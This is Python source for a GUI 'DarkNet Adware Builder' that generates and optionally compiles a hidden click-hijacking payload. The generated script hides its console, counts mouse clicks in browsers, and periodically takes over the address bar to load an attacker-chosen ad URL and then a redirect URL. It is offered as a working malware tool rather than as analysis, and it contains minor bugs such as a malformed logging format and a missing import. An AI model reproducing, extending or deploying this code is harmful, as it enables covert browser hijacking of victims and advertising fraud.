import sys
import random
import threading
import time
import logging
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QComboBox, QHBoxLayout, QGroupBox, QCheckBox, QTimeEdit, QSpinBox, QTabWidget, QSplashScreen, QMessageBox)
from PyQt5.QtGui import QFont, QPixmap
from PyQt5.QtCore import Qt, QTime, QTimer
from pynput import mouse
import pygetwindow as gw
import pyautogui
import win32gui
import win32con
import os

# Logging setup
log_file = "click_hijacker.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levellevel)s - %(message)s')

class AdwareBuilder(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('DarkNet Adware Builder @FixGFATHER')
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: black; color: white;")
        self.setFont(QFont('Arial', 12))

        main_layout = QVBoxLayout()

        # Title
        title = QLabel('DarkNet Adware Builder')
        title.setFont(QFont('Arial', 28))
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("color: red;")
        main_layout.addWidget(title)

        # Tabs
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid red;
                border-radius: 10px;
            }
            QTabBar::tab {
                background: #333;
                color: white;
                padding: 10px;
                font-size: 18px;
                border: 1px solid red;
                border-radius: 10px;
                margin: 2px;
                width: 100px;
            }
            QTabBar::tab:selected {
                background: red;
                color: black;
            }
        """)
        self.tabs.addTab(self.build_tab_ui(), "Build")
        self.tabs.addTab(self.info_tab_ui(), "Info")
        self.tabs.addTab(self.credits_tab_ui(), "Credits")
        main_layout.addWidget(self.tabs)

        self.setLayout(main_layout)

    def build_tab_ui(self):
        build_tab = QWidget()
        layout = QVBoxLayout()

        # Ad URL input
        ad_url_layout = QHBoxLayout()
        self.ad_url_input = QLineEdit(self)
        self.ad_url_input.setPlaceholderText('Enter Ad URL Here')
        self.ad_url_input.setStyleSheet("color: white; background-color: #333; border: 1px solid red; padding: 10px; font-size: 20px; border-radius: 10px;")
        ad_url_layout.addWidget(self.ad_url_input)
        layout.addLayout(ad_url_layout)

        # Redirect URL input
        redirect_url_layout = QHBoxLayout()
        self.redirect_url_input = QLineEdit(self)
        self.redirect_url_input.setPlaceholderText('Enter Redirect URL Here')
        self.redirect_url_input.setStyleSheet("color: white; background-color: #333; border: 1px solid red; padding: 10px; font-size: 20px; border-radius: 10px;")
        redirect_url_layout.addWidget(self.redirect_url_input)
        layout.addLayout(redirect_url_layout)

        # Features section
        features_group = QGroupBox("Features")
        features_layout = QVBoxLayout()
        self.features = {
            "Adware Feature": QCheckBox("Adware Feature"),
            "Stealth Mode": QCheckBox("Stealth Mode"),
            "Scheduled Ad Display": QCheckBox("Scheduled Ad Display"),
            "Dynamic Ad URLs": QCheckBox("Dynamic Ad URLs")
        }

        for feature, checkbox in self.features.items():
            checkbox.setStyleSheet("""
                QCheckBox {
                    color: white;
                    font-size: 18px;
                    padding: 5px;
                    margin: 5px;
                }
                QCheckBox:hover {
                    background-color: #444;
                }
            """)
            features_layout.addWidget(checkbox)

        features_group.setLayout(features_layout)
        features_group.setStyleSheet("color: white; border: 1px solid red; padding: 10px; border-radius: 10px;")
        layout.addWidget(features_group)

        # Schedule Time
        self.schedule_time_edit = QTimeEdit(self)
        self.schedule_time_edit.setTime(QTime.currentTime())
        self.schedule_time_edit.setStyleSheet("color: white; background-color: #333; border: 1px solid red; padding: 5px; border-radius: 10px;")
        features_layout.addWidget(QLabel("Schedule Time (for Scheduled Ad Display):"))
        features_layout.addWidget(self.schedule_time_edit)

        # Click Threshold
        self.click_threshold_spinbox = QSpinBox(self)
        self.click_threshold_spinbox.setRange(1, 1000)
        self.click_threshold_spinbox.setValue(30)
        self.click_threshold_spinbox.setStyleSheet("""
            QSpinBox {
                color: white; 
                background-color: #333; 
                border: 1px solid red; 
                padding: 5px; 
                border-radius: 10px;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #555;
                border: 1px solid red;
                width: 16px;
            }
        """)
        features_layout.addWidget(QLabel("Click Threshold:"))
        features_layout.addWidget(self.click_threshold_spinbox)

        # Output options and build button
        output_and_build_layout = QHBoxLayout()
        
        # Output options
        self.output_type = QComboBox()
        self.output_type.addItems(["Output: EXE File", "Output: PY File"])
        self.output_type.setStyleSheet("""
            QComboBox {
                color: white; 
                background-color: #333; 
                border: 1px solid red; 
                padding: 10px; 
                font-size: 18px; 
                border-radius: 10px;
            }
            QComboBox::drop-down {
                background-color: #555;
                border: 1px solid red;
            }
        """)
        output_and_build_layout.addWidget(self.output_type)

        # Build button
        self.build_button = QPushButton('Build', self)
        self.build_button.setStyleSheet("""
            QPushButton {
                background-color: green; 
                color: white; 
                border: 1px solid white;
                padding: 10px;
                font-size: 18px;
                border-radius: 10px;
            }
            QPushButton:hover {
                background-color: #005500;
            }
        """)
        self.build_button.clicked.connect(self.build_adware)
        output_and_build_layout.addWidget(self.build_button)

        layout.addLayout(output_and_build_layout)
        layout.addStretch()
        
        build_tab.setLayout(layout)
        return build_tab

    def info_tab_ui(self):
        info_tab = QWidget()
        layout = QVBoxLayout()

        info_label = QLabel(
            "Adware Features Explained:\n\n"
            "Adware Feature: Displays ads periodically based on click thresholds.\n"
            "Stealth Mode: Hides the adware from being visible on the system.\n"
            "Scheduled Ad Display: Allows scheduling ads at specific times.\n"
            "Dynamic Ad URLs: Allows changing ad URLs dynamically.\n\n"
            "Click Threshold: Number of clicks required to trigger an ad display.\n\n"
            "Stealth Mode: Hides the console window.\n"
            "Scheduled Ad Display: Displays ads at specific times.\n"
            "Dynamic Ad URLs: Allows changing ad URLs dynamically without restarting the tool.\n"
        )
        info_label.setStyleSheet("color: white; font-size: 18px;")
        layout.addWidget(info_label)

        info_tab.setLayout(layout)
        return info_tab

    def credits_tab_ui(self):
        credits_tab = QWidget()
        layout = QVBoxLayout()

        credits_label = QLabel("Credits:\n\n"
                               "Tool developed by FixGFATHER aka godfather_py")
        credits_label.setStyleSheet("color: white; font-size: 18px;")
        layout.addWidget(credits_label)

        github_button = QPushButton('Visit GitHub', self)
        github_button.setStyleSheet("""
            QPushButton {
                background-color: #333;
                color: white;
                border: 1px solid red;
                padding: 10px;
                font-size: 18px;
                border-radius: 10px;
            }
            QPushButton:hover {
                background-color: #555;
            }
        """)
        github_button.clicked.connect(self.open_github)
        layout.addWidget(github_button)

        credits_tab.setLayout(layout)
        return credits_tab

    def open_github(self):
        import webbrowser
        webbrowser.open('https://github.com/FixGFATHER')

    def build_adware(self):
        ad_url = self.ad_url_input.text().strip()
        redirect_url = self.redirect_url_input.text().strip()

        click_threshold = self.click_threshold_spinbox.value()
        schedule_time = self.schedule_time_edit.time().toString()

        script_content = f"""
import time
import random
import threading
import logging
from pynput import mouse
import pygetwindow as gw
import pyautogui
import win32gui
import win32con
import os

# URL to open periodically (replace with your PPV/PPC ad network URL)
ad_url = "{ad_url}"

# Redirect URL
redirect_url = "{redirect_url}"

# Browsers to monitor
browsers = ["edge", "chrome", "firefox", "opera", "brave", "vivaldi", "yandex", "safari", "internet explorer", "tor"]

# Click threshold
click_threshold = {click_threshold}

# Counter for mouse clicks
click_count = 0

# Flag to control the adware
run_adware = True

# Log file for debug information
log_file = "click_hijacker.log"

# Setup logging
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def hide_console():
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

def get_active_window_title():
    window = gw.getActiveWindow()
    if window is not None:
        return window.title.lower()
    return ""

def is_browser_active():
    title = get_active_window_title()
    return any(browser in title for browser in browsers)

def show_ad():
    global click_count, click_threshold
    while run_adware:
        if click_count >= click_threshold:
            click_count = 0  # Reset click count
            click_threshold = random.randint(30, 100)  # Reset click threshold
            try:
                if is_browser_active():
                    # Open the ad URL in the current tab
                    pyautogui.hotkey('ctrl', 'l')  # Focus the address bar
                    time.sleep(0.1)  # Short wait to ensure the address bar is focused
                    pyautogui.typewrite(ad_url)  # Type the URL instantly
                    pyautogui.press('enter')  # Press enter to load the URL
                    time.sleep(10)  # Wait for 10 seconds
                    pyautogui.hotkey('ctrl', 'l')  # Focus the address bar again
                    pyautogui.typewrite(redirect_url)  # Type the redirect URL instantly
                    pyautogui.press('enter')  # Press enter to load the redirect URL
                    logging.info(f"Opened ad URL: {ad_url} and redirected to: {redirect_url}")
                else:
                    logging.info("Active window is not a browser. Ad not opened.")
            except Exception as e:
                logging.error(f"Failed to open ad URL: {{e}}")
        time.sleep(1)  # Check every second

def on_click(x, y, button, pressed):
    global click_count
    if pressed and is_browser_active():
        click_count += 1
        logging.info(f"Mouse clicked. Current click count: {{click_count}}")

def start_adware():
    logging.info("Adware started.")
    threading.Thread(target=show_ad).start()
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

if __name__ == "__main__":
    hide_console()
    start_adware()
"""

        self.build_button.setText("Build...")

        output_type = self.output_type.currentText()
        if "EXE" in output_type:
            file_name = "adware.py"
            with open(file_name, "w") as file:
                file.write(script_content)
            os.system(f"pyinstaller --onefile --noconsole {file_name}")
            QMessageBox.information(self, "Build Success", "Adware EXE built successfully!")
        else:
            file_name, _ = QFileDialog.getSaveFileName(self, "Save Adware Script", "", "Python Files (*.py)")
            if file_name:
                with open(file_name, "w") as file:
                    file.write(script_content)
                QMessageBox.information(self, "Build Success", "Adware script built successfully!")

        self.build_button.setText("Build")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = AdwareBuilder()
    ex.show()
    sys.exit(app.exec_())
